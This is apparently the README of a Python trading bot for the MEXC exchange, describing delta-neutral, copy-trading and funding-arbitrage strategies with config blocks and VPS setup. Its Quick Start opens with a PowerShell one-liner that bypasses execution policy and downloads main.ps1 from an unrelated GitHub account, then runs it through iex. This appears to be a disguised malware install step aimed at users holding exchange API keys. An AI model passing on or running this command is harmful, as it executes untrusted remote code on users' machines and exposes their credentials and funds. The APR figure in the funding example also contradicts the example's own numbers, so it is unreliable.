# 🤖 MEXC Strategy Trading Bot

> Automated trading bot for [MEXC](https://www.mexc.com/register) built for **0-fee markets** — three independent strategies, zero commissions eating your edge

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![MEXC](https://img.shields.io/badge/MEXC-Exchange-1DBBAA?style=for-the-badge&logoColor=white)](https://www.mexc.com/register)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/omgmad/mexc-strategy-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/mexc-strategy-bot/stargazers)

```
╔══════════════════════════════════════════════════════════════════╗
║  Strategy 1 — Delta-Neutral      │  near-zero directional risk  ║
║  Strategy 2 — Copy Trading       │  mirror top traders live     ║
║  Strategy 3 — Funding Arbitrage  │  harvest funding rate yields ║
║                                                                  ║
║  All strategies run on MEXC 0-fee markets — keep 100% of edge  ║
╚══════════════════════════════════════════════════════════════════╝
```

**[🚀 Create MEXC Account](https://www.mexc.com/register)** · **[📊 MEXC Futures](https://futures.mexc.com)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**

---

## 🚀 Quick Start

If you just want to get the project running fast on Windows, use the installation command below first. After that, continue with the project-specific setup, configuration, and usage sections.

### 🛠️ Installation

#### CMD
Open **CMD** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/Neutral-Debug/Mexc-Trading-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

> Then continue with the project-specific setup steps below.

## 📘 Project-Specific Setup

### Step 2 — Create a virtual environment

```bash
python3 -m venv venv

# Linux / Mac
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### Step 3 — Install dependencies

```bash
pip install ccxt requests python-dotenv colorama
```

### Step 4 — Create a MEXC API key

1. Log in to [MEXC](https://www.mexc.com/register)
2. Navigate to **Account → API Management → Create API**
3. Enable permissions: **Spot Trading** + **Futures Trading**
4. Set an IP whitelist if running on a VPS (recommended)
5. Save your **API Key** and **Secret Key**

> ⚠️ Never enable withdrawal permissions on a trading API key. The bot only needs trade permissions.

---

## 📌 Table of Contents

- [Quick Start](#-quick-start)
- [Why MEXC 0-Fee Markets](#-why-mexc-0-fee-markets)
- [Strategies](#-strategies)
  - [Strategy 1 — Delta-Neutral](#strategy-1--delta-neutral)
  - [Strategy 2 — Copy Trading](#strategy-2--copy-trading)
  - [Strategy 3 — Funding Arbitrage](#strategy-3--funding-arbitrage)
- [Installation](#installation)
- [Configuration `.env`](#configuration-env)
- [Running the Bot](#running-the-bot)
- [Running 24/7 on a VPS](#running-247-on-a-vps)
- [Risk Management](#risk-management)
- [Telegram Commands](#telegram-commands)
- [Disclaimer](#disclaimer)

---

## 💡 Why MEXC 0-Fee Markets

MEXC offers **0% maker fee** on spot and **0% maker fee** on futures for a large number of pairs. This changes the math for all three strategies:

| Exchange | Maker Fee | Round-trip cost (open + close) |
|----------|-----------|-------------------------------|
| Typical CEX | 0.02–0.10% | 0.04–0.20% |
| **MEXC 0-fee market** | **0%** | **$0.00** |

For high-frequency rebalancing (Delta-Neutral) or thin funding spreads (Funding Arb), eliminating fees is the difference between a profitable strategy and a losing one.

**0-fee pairs include:** `BTC_USDT`, `ETH_USDT`, `SOL_USDT`, `XRP_USDT`, `DOGE_USDT`, and [many more](https://www.mexc.com/fee). Always verify a pair is 0-fee before enabling it in config.

> ⚠️ MEXC charges a **taker fee** (0.05% spot / 0.01% futures) on market orders. All strategies in this bot default to **limit/post-only orders** to guarantee 0-fee execution.

---

## 📐 Strategies

### ⚖️ Strategy 1 — Delta-Neutral

Earn on volatility and funding rates while staying neutral to market direction. Your profit does not depend on whether the price goes up or down.

```
  Open LONG on spot (SOL_USDT)  +  SHORT on futures (SOL_USDT)
                  │
                  ▼
  Positions hedge each other → net delta ≈ 0
                  │
                  ▼
  Profit comes from:
    • positive funding rate payments (futures longs pay shorts)
    • spread captured during limit-order rebalancing  (0 fees!)
```

**How it works:**

1. The bot opens equal-sized LONG (spot) and SHORT (futures) positions on the same asset using limit orders — **0 fee on both legs**.
2. Every N hours the bot checks delta drift caused by price movement and rebalances with new limit orders if the deviation exceeds the threshold.
3. When the funding rate turns negative, the bot inverts positions (SHORT spot + LONG futures) to keep collecting payments.

**Decision table:**

| Condition | Action |
|-----------|--------|
| Funding rate > 0.01% | Hold SHORT on futures, collect payments |
| Funding rate < -0.01% | Invert positions |
| Delta drifted > 5% | Rebalance with limit orders |
| High volatility detected | Reduce position size |

**Config block:**

```env
STRATEGY=delta_neutral
DN_SYMBOL=SOL_USDT
DN_SPOT_SIZE=100           # USDT in spot leg
DN_FUTURES_SIZE=100        # USDT in futures leg
DN_REBALANCE_THRESHOLD=5   # % of drift before rebalancing
DN_MIN_FUNDING=0.005       # Minimum funding rate to enter (%)
DN_CHECK_INTERVAL=3600     # Check every N seconds
DN_ORDER_TYPE=LIMIT        # Always LIMIT for 0-fee execution
```

> 💡 **Tip:** This strategy performs best during bull markets when futures funding rates are consistently positive. Check MEXC's funding rate history before entering — avoid assets with erratic or near-zero rates.

---

### 📡 Strategy 2 — Copy Trading

The bot polls a chosen leader's positions via the MEXC API every 5 seconds. When a change is detected, it immediately places a proportionally scaled **limit order** on your account — 0 fees, full edge preserved.

```
  Leader opens SOL_USDT SHORT $500 (futures)
                │
                ▼  (detected within 5 seconds)
                │
  Bot calculates position size:
  $500 × copy_ratio (0.5) = $250
  Your MAX_SOL = $30  →  capped at $30
                │
                ▼
  Your account opens SOL_USDT SHORT $30 ✅  (limit order, 0 fee)
                │
                ▼
  Leader closes position → Bot closes too ✅
```

**Choosing who to copy:**

Use the [MEXC Leaderboard](https://futures.mexc.com/copy-trade) to find consistently profitable traders.

✅ **Good traders to copy:**
- Consistent long-term PnL (not just one lucky week)
- Holds positions for hours or days (swing trading)
- Makes 1–5 trades per day
- Clear directional bias — not constantly flipping sides

❌ **Do NOT copy these:**
- **HFT / High-Frequency Traders** — trade dozens of times per second, your bot can't keep up and loses on slippage
- **Market Makers** — hold positions on both sides simultaneously, copying causes guaranteed loss
- **Scalpers** — hold positions for seconds or minutes, orders won't fill in time
- **Bot traders** — automated patterns that don't translate well to copy trading
- **Leverage manipulators** — constantly change leverage to distort position sizing

> 💡 **Tip:** Check a trader's history and look at how long they hold positions. Target traders who hold for 2+ hours on average.

**Config block:**

```env
STRATEGY=copy_trading
LEADER_UID=mexc_leader_uid_here   # Leader's MEXC UID (from their profile)
COPY_RATIO=0.5                    # 0.5 = copy 50% of leader's size
SYMBOLS=SOL_USDT,BTC_USDT         # Leave blank to follow all symbols
SYNC_INTERVAL=5                   # How often to poll leader positions (seconds)
ORDER_TYPE=LIMIT                  # LIMIT for 0-fee, MARKET as fallback
LIMIT_OFFSET_BPS=2                # Place limit 0.02% inside spread for fast fill
```

---

### 💸 Strategy 3 — Funding Arbitrage

The bot scans MEXC futures for anomalously high funding rates and collects payments with minimal directional exposure — all entries via limit orders at 0 fee.

```
  Scan all MEXC futures → find funding rate above entry threshold
                │
                ▼
  Open position AGAINST the funding direction via limit order:
    • Funding > 0  →  SHORT  (longs pay shorts every 8h)
    • Funding < 0  →  LONG   (shorts pay longs every 8h)
                │
                ▼
  Collect payment every 8 hours  ($0 fee eaten into yield)
                │
                ▼
  Exit when any of these triggers:
    • Rate normalizes below exit_threshold
    • Target PnL is reached
    • Position held longer than max_hold_hours
```

**Why it works — especially on MEXC:**

On a typical exchange, a 0.03% funding yield per 8h is almost entirely consumed by the 0.02–0.04% round-trip fee when you exit. On MEXC 0-fee markets, **you keep the full yield**. Even modest funding rates become worth capturing.

**Example scenario:**

```
SOL_USDT futures funding = +0.03% per 8h  (would be unprofitable elsewhere)
Bot opens $100 SHORT on SOL_USDT futures  (limit order, fee = $0.00)
  → receives $0.03 every 8 hours
  → over 48 hours = $0.18 on $100 deployed
  → annualized rate ≈ 6.5% APR  (net, after $0 fees)

Same trade on 0.04% fee exchange:
  → $0.04 entry + $0.04 exit = $0.08 total fees on $100
  → profit after fees = $0.18 - $0.08 = $0.10  (44% eaten by fees)
```

**Config block:**

```env
STRATEGY=funding_arb
FA_SCAN_SYMBOLS=SOL_USDT,BTC_USDT,ETH_USDT,XRP_USDT,DOGE_USDT
FA_MIN_FUNDING=0.02          # Minimum rate to enter (% per 8h) — lower threshold thanks to 0 fees
FA_EXIT_FUNDING=0.005        # Rate at which to exit the position (%)
FA_POSITION_SIZE=50          # Position size in USDT
FA_MAX_HOLD_HOURS=48         # Maximum time to hold a position
FA_HEDGE_RATIO=0.3           # Spot hedge as fraction of futures size (0 = no hedge)
FA_CHECK_INTERVAL=300        # Scan every N seconds
FA_ORDER_TYPE=LIMIT          # Always LIMIT for 0-fee execution
```

> 💡 **Tip:** The 0-fee advantage lets you lower `FA_MIN_FUNDING` significantly compared to other exchanges. Rates above 0.02% per 8h are worth capturing here — on a fee-paying exchange you'd need 0.05%+.

---


### Requirements

- Python 3.10+
- A [MEXC](https://www.mexc.com/register) account with futures enabled
- API key with **spot** and **futures** trading permissions
- At least $10 USDT deposited

## ⚙️ Configuration `.env`

Create a `.env` file in the project folder:

```env
# ── MEXC API credentials ───────────────────────────────
MEXC_API_KEY=your_api_key_here
MEXC_SECRET_KEY=your_secret_key_here

# ── Active strategy ────────────────────────────────────
# Options: delta_neutral | copy_trading | funding_arb
STRATEGY=copy_trading

# ── Order type ─────────────────────────────────────────
# LIMIT  = 0-fee maker orders (default, recommended)
# MARKET = taker fee applies (0.05% spot / 0.01% futures)
DEFAULT_ORDER_TYPE=LIMIT

# ── Max position per symbol (USDT) ─────────────────────
MAX_BTC=50
MAX_ETH=50
MAX_SOL=30
MAX_XRP=30
MAX_TOTAL=100             # Total exposure cap across all symbols

# ── Risk limits ────────────────────────────────────────
DAILY_LOSS_LIMIT=10       # Bot halts if daily loss exceeds this ($)
UNREALIZED_LOSS_LIMIT=15  # Force-closes all positions if exceeded ($)

# ── Telegram (optional) ────────────────────────────────
TELEGRAM_TOKEN=
TELEGRAM_CHAT_ID=

# ── Strategy-specific parameters ──────────────────────
# Paste the relevant config block from the strategy sections above
```

### Key distinction

```
MEXC_API_KEY    = your API key        (read + trade, no withdrawals)
MEXC_SECRET_KEY = your secret key     (never share this)
LEADER_UID      = the trader you copy (their public MEXC UID)
```

---

## 🚀 Running the Bot

```bash
# First-time setup wizard
python mexc_bot.py --setup

# Normal start
python mexc_bot.py

# Dashboard only (no trading)
python mexc_bot.py --dashboard
```

On successful start:

```
╔══════════════════════════════════════════════════════╗
║   🤖  MEXC Strategy Bot v2.0                         ║
║   Press Ctrl+C at any time to stop.                  ║
╚══════════════════════════════════════════════════════╝

  Strategy:   copy_trading
  Account:    ****6789 (MEXC)
  Ratio:      50%
  Symbols:    SOL_USDT, BTC_USDT
  Order type: LIMIT (0-fee)

  Start bot? [yes/no]: yes
```

**Live terminal dashboard:**

```
🤖 MEXC Strategy Bot v2.0                  updated 09:04:15
══════════════════════════════════════════════════════════════
  Status: ● RUNNING   Strategy: copy_trading   Sync: 5s
  Leader: UID 12345678   Copies today: 3   Fees paid: $0.00
──────────────────────────────────────────────────────────────
  POSITIONS
  Symbol          Size     Side        Entry     Exposure   Max
  SOL_USDT       1.7000   SHORT ▼    $87.42    $  14.7   $  30
                [███████░] 49%
──────────────────────────────────────────────────────────────
  RISK
  Exposure   [████░░░░░░] $14.7 / $100
  Daily loss [░░░░░░░░░░] $0.00 / $10
  Unrealized  $+0.12  (limit: -$15)
──────────────────────────────────────────────────────────────
  RECENT TRADES
  09:04:15  SOL_USDT    SELL   $  15.0   fee $0.000  ✅ 0-fee
  08:42:50  SOL_USDT    SELL   $  15.0   fee $0.000  ✅ 0-fee
```

---

## 🖥️ Running 24/7 on a VPS

For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).

### Ubuntu VPS setup

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y
sudo apt install python3 python3-pip python3-venv screen git -y

# 2. Clone repo
git clone https://github.com/omgmad/mexc-strategy-bot
cd mexc-strategy-bot

# 3. Virtual environment
python3 -m venv venv
source venv/bin/activate
pip install ccxt requests python-dotenv colorama

# 4. Configure
nano .env   # paste your API key, secret, and strategy settings

# 5. Run inside screen (stays alive after you disconnect)
screen -S mexcbot
source venv/bin/activate
python mexc_bot.py

# Press Ctrl+A then D to detach — bot keeps running
```

### Reconnect later

```bash
screen -r mexcbot
```

### Useful log commands

```bash
tail -50 mexc_bot.log
grep "filled" mexc_bot.log | tail -20          # Successful fills
grep "0-fee" mexc_bot.log | tail -20           # Confirmed 0-fee executions
grep "OPEN\|CLOSE" mexc_bot.log | tail -20     # All order attempts
grep "funding" mexc_bot.log | tail -20         # Funding rate events
grep "taker" mexc_bot.log | tail -10           # Unexpected taker fee warnings
```

---

## 🛡️ Risk Management

```
DAILY_LOSS_LIMIT hit       ──► Bot halts + closes all positions
UNREALIZED_LOSS_LIMIT hit  ──► Immediately force-closes all (market order)
MAX_TOTAL exceeded          ──► Blocks all new positions
MAX_{SYMBOL} exceeded       ──► Blocks new positions for that symbol only
LIMIT ORDER REJECTED        ──► Bot retries; never auto-falls back to market
```

> The last rule is important: if a limit order is rejected or times out, the bot will **retry** rather than silently place a market order and incur fees. You can override this with `ALLOW_MARKET_FALLBACK=true` at your own discretion.

### Safe starter config (beginners)

```env
COPY_RATIO=0.3
MAX_SOL=15
MAX_BTC=15
MAX_TOTAL=30
DAILY_LOSS_LIMIT=5
UNREALIZED_LOSS_LIMIT=8
DEFAULT_ORDER_TYPE=LIMIT
```

> ⚠️ **Always start small.** Run the bot for a few hours with minimal capital before scaling up, regardless of which strategy you choose.

---

## 📱 Telegram Setup & Commands

Telegram integration lets you receive trade alerts and control the bot remotely. Setup takes about 2 minutes.

### Step 1 — Create a bot and get your token

1. Open Telegram and search for **`@BotFather`**
2. Send `/newbot` and follow the prompts
3. BotFather will reply with a token — copy it into `.env`:

```env
TELEGRAM_TOKEN=your_bot_token_here
```

### Step 2 — Get your Chat ID

1. Search for **`@userinfobot`** on Telegram
2. Send any message — it replies with your numeric ID
3. Copy it into `.env`:

```env
TELEGRAM_CHAT_ID=123456789
```

### Step 3 — Activate your bot

Find your bot by username in Telegram and press **Start** once before launching the trading bot.

### Commands

| Command | Action |
|---------|--------|
| `/status` | Current positions, PnL, active strategy |
| `/pause` | Pause the bot (keeps existing positions open) |
| `/resume` | Resume the bot |
| `/close` | Close all positions immediately (market order) |
| `/stop` | Stop the bot completely |
| `/pnl` | Detailed PnL breakdown |
| `/strategy` | Show current strategy and parameters |
| `/fees` | Show total fees paid this session (should be $0.00) |

### Example alerts

```
📈 Trade Opened
Strategy: copy_trading
Symbol:   SOL_USDT
Action:   SELL 1.70
Value:    ~$14.7
Type:     LIMIT (0-fee) ✅
Ratio:    50%

💰 Funding Collected
Strategy: funding_arb
Symbol:   BTC_USDT
Amount:   +$0.043
Rate:     0.043% per 8h
Net fee:  $0.00

🛑 Bot Stopped
Reason:   Daily loss limit reached ($10.00)
Action:   All positions closed
```

---

## ⚠️ Disclaimer

> **RISK WARNING:** This bot trades real money on a live exchange. All three strategies carry significant financial risk. Past performance does not guarantee future results. You may lose some or all of your capital. Use entirely at your own risk.

- Never invest more than you can afford to lose
- Verify that your target symbols are still 0-fee before deploying — MEXC can change fee schedules
- Do not copy HFT, Market Maker, or scalper traders
- Always test with a small amount before scaling up
- Never share your `.env` file or API credentials with anyone
- Secure your VPS — treat it like an exchange account
- Disable withdrawal permissions on your API key
- Check your local regulations regarding automated trading

---

## 🔗 Links

[![MEXC](https://img.shields.io/badge/🟢_MEXC-Create_Account-1DBBAA?style=for-the-badge)](https://www.mexc.com/register)
[![Futures](https://img.shields.io/badge/📊_MEXC_Futures-Leaderboard-0066FF?style=for-the-badge)](https://futures.mexc.com/copy-trade)
[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)

**If this helped you, please give it a ⭐ Star — it means a lot!**

## 🔍 Topics

`mexc-bot` `mexc-trading-bot` `mexc-strategy-bot` `zero-fee-trading` `defi-trading` `automated-trading` `crypto-bot` `perp-trading` `delta-neutral` `copy-trading` `funding-arbitrage` `python-trading-bot` `ccxt-bot` `futures-trading` `funding-rate` `hedge-strategy` `real-time-trading` `limit-orders` `0-fee-bot` `mexc-futures` `risk-management` `telegram-bot`
